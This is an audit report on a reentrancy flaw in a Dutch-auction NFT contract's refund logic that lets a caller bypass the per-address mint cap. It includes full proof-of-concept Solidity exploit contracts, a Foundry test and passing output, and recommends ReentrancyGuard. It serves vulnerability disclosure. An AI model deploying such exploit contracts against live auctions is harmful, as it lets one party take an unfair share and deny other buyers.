# [M] CAP_PER_ADDRESS constraint in MeritDutchAuction contract can be by-passed

## Summary
Severity: Medium
Reporter: pep7siup
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/ab734b575dc3b268de0457c2e3ab0e7d10cd7dd8/dutch-nft/src/MeritDutchAuction.sol#L128-L169
Type: audit-issue

## Details
# CAP_PER_ADDRESS constraint in MeritDutchAuction contract can be by-passed

## Summary

The MeritDutchAuction contract has a Reentrancy vulnerability where the CAP_PER_ADDRESS constraint can be bypassed, allowing a malicious participant to mint an excessive number of MeritNFTs.

## Vulnerability Detail

```solidity
function mint(uint256 amount) external payable {
        ...
        if(msg.value > totalPaid) {
            // If too much ETH was sent, refund the difference
            (bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
            require(success, "Refund failed");
        }
	...
}
```
The mint() function includes a check to reimburse any extra ETH sent by the caller. However, due to the absence of a ReentrancyGuard modifier, an attacker can exploit this vulnerability by executing the mint() function multiple times within a single transaction using multiple proxy contracts. This allows the attacker to repeatedly activate the reimbursement mechanism by sending an msg.value larger than the pre-determined totalPaid value. Consequently, the refund call triggers the fallback() function in the Exploit contract (as demonstrated in the Proof of Concept below), enabling the attacker to re-enter the mint() function with a new address. By artificially generating multiple addresses and invoking the mint() function, the attacker can bypass the intended limitations and mint a greater number of NFTs than the CAP_PER_ADDRESS allows.

## POC

### exploit-contract.patch

```patch
diff --git a/dutch-nft/test/Exploit.sol b/dutch-nft/test/Exploit.sol
new file mode 100644
index 0000000..21b1602
--- /dev/null
+++ b/dutch-nft/test/Exploit.sol
@@ -0,0 +1,60 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+import "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";
+import "../src/MeritDutchAuction.sol";
+
+contract Exploit {
+    address immutable meritNFT;
+    address immutable auction;
+    uint256 minted;
+    address receiver;
+
+    constructor(address _meritNFT, address _auction) {
+        meritNFT = _meritNFT;
+        auction = _auction;
+    }
+
+    function execute(uint256 _amount) external payable {
+        minted = _amount;
+        receiver = msg.sender;
+        MeritDutchAuction(auction).mint{value: msg.value}(_amount);
+    }
+
+    // Transfer minted NFTs to attacker's wallet
+    function _afterExecute(
+        address _nft,
+        uint256 _amount,
+        address payable _to
+    ) internal {
+        for (uint256 i = 0; i < _amount; i++) {
+            uint256 tokenId = IERC721Enumerable(_nft).tokenOfOwnerByIndex(
+                address(this),
+                0
+            );
+            IERC721Enumerable(_nft).safeTransferFrom(
+                address(this),
+                _to,
+                tokenId
+            );
+        }
+    }
+
+    // Refund & trigger a reentrancy
+    function _fallback() internal {
+        if (msg.sender == address(auction)) {
+            _afterExecute(meritNFT, minted, payable(receiver));
+            (bool success, ) = payable(receiver).call{
+                value: address(this).balance
+            }("");
+            require(success, "Exploit: Refund failed");
+        }
+    }
+
+    fallback() external payable {
+        _fallback();
+    }
+
+    receive() external payable {
+        _fallback();
+    }
+}
diff --git a/dutch-nft/test/ExploitFactory.sol b/dutch-nft/test/ExploitFactory.sol
new file mode 100644
index 0000000..f67cf33
--- /dev/null
+++ b/dutch-nft/test/ExploitFactory.sol
@@ -0,0 +1,82 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+import "@openzeppelin/contracts/proxy/Clones.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import "./Exploit.sol";
+import "../src/MeritDutchAuction.sol";
+
+contract ExploitFactoryClone is Ownable, IERC721Receiver {
+    address immutable exploitImplementation;
+    Exploit _exploitContract;
+    address immutable meritNFT;
+    MeritDutchAuction immutable auction;
+    uint256 immutable MINT_CAP;
+    uint256 immutable CAP_PER_ADDRESS;
+    uint256 amountToMint;
+
+    constructor(address _meritNFT, address _auction) {
+        exploitImplementation = address(new Exploit(_meritNFT, _auction));
+        meritNFT = _meritNFT;
+        auction = MeritDutchAuction(_auction);
+        MINT_CAP = auction.MINT_CAP();
+        CAP_PER_ADDRESS = auction.CAP_PER_ADDRESS();
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 tokenId,
+        bytes calldata
+    ) external returns (bytes4) {
+        IERC721(meritNFT).safeTransferFrom(address(this), owner(), tokenId);
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function _createExploit() internal returns (address) {
+        address clone = Clones.clone(exploitImplementation);
+        return clone;
+    }
+
+    function _exploit(uint256 _amount) internal {
+        uint256 price = auction.getPrice();
+        uint256 amount = _amount >= CAP_PER_ADDRESS ? CAP_PER_ADDRESS : _amount;
+
+        if (amount > 0) {
+            _exploitContract = Exploit(payable(_createExploit()));
+            // Force refund
+            _exploitContract.execute{value: price * amount + 1}(amount);
+        }
+    }
+
+    function exploit(uint256 _amountToMint) external payable onlyOwner {
+        amountToMint = _amountToMint;
+        _exploit(amountToMint);
+    }
+
+    function cleanup() external onlyOwner {
+        (bool success, ) = payable(msg.sender).call{
+            value: address(this).balance
+        }("");
+        require(success, "Exploit Factory: Refund failed");
+    }
+
+    function _fallback() internal {
+        if (msg.sender == owner()) {
+            return;
+        }
+        if (msg.sender == address(_exploitContract)) {
+            amountToMint -= CAP_PER_ADDRESS;
+            _exploit(amountToMint);
+        }
+    }
+
+    fallback() external payable {
+        _fallback();
+    }
+
+    receive() external payable {
+        _fallback();
+    }
+}
```

### exploit-test.patch

```patch
diff --git a/dutch-nft/test/MeritDutchAuction.t.sol b/dutch-nft/test/MeritDutchAuction.t.sol
index 0b40fdc..c1663e3 100644
--- a/dutch-nft/test/MeritDutchAuction.t.sol
+++ b/dutch-nft/test/MeritDutchAuction.t.sol
@@ -4,6 +4,7 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/MeritNFT.sol";
 import "../src/MeritDutchAuction.sol";
+import "./ExploitFactory.sol";
 
 contract MeritDutchAuctionTest is Test {
     string constant NAME = "Merit NFT";
@@ -208,6 +209,34 @@ contract MeritDutchAuctionTest is Test {
         vm.stopPrank();
     }
 
+    function testMintExceedingCapPerAddress() public {
+        address exploiter = address(1111);
+        uint256 mintAmount = 500;
+        vm.startPrank(exploiter);
+        vm.warp(startTime);
+
+        ExploitFactoryClone _exploitContract = new ExploitFactoryClone(address(nft), address(auction));
+
+        // Prepare exploit fund with 1 extra wei to force auction refund
+        uint256 exploitFund = mintAmount * auction.getPrice() + 1;
+        deal(address(exploiter), exploitFund * 2);
+        (bool success,) = payable(_exploitContract).call{value: exploitFund}("");
+        assertEq(success, true);
+
+        // Execute the exploit
+        _exploitContract.exploit(mintAmount);
+        _exploitContract.cleanup();
+
+        assertEq(auction.minted(), mintAmount);
+        assertEq(nft.totalSupply(), mintAmount);
+
+        // exploiter can bypass CAP_PER_ADDRESS to mint NFTs exceeding CAP_PER_ADDRESS amount
+        assertEq(nft.balanceOf(exploiter), mintAmount);
+
+        assertEq(address(_exploitContract).balance, 0);
+        vm.stopPrank();
+    }
+
     function testClaimProceeds() public {
         vm.startPrank(wallet1);
         vm.warp(startTime);
```

### Test result

```bash
forge test -vv --match-test testMintExceedingCapPerAddress 
[⠔] Compiling...
No files changed, compilation skipped

Running 1 test for test/MeritDutchAuction.t.sol:MeritDutchAuctionTest
[PASS] testMintExceedingCapPerAddress() (gas: 102361520)
Test result: ok. 1 passed; 0 failed; finished in 46.87ms
```

The test result confirmed that the NFT balance of the attacker after executing the exploit equals to `mintAmount = 500` which is much larger than CAP_PER_ADDRESS. This proved that just within one transaction, the attacker is able to deny a fair chance for other users to obtain their NFTs.

## Impact

The vulnerability enables a malicious participant to exceed the CAP_PER_ADDRESS constraint and mint an excessive amount of MeritNFTs. This can disrupt the fairness of the auction, as other participants may be unable to acquire NFTs due to the attacker's exploitation.

## Code Snippet

https://github.com/sherlock-audit/2023-07-beam-auction/blob/ab734b575dc3b268de0457c2e3ab0e7d10cd7dd8/dutch-nft/src/MeritDutchAuction.sol#L128-L169

## Tool used

VsCode

## Recommendation

It is recommended to protect the mint() function in the MeritDutchAuction contract with OpenZeppelin's ReentrancyGuard.
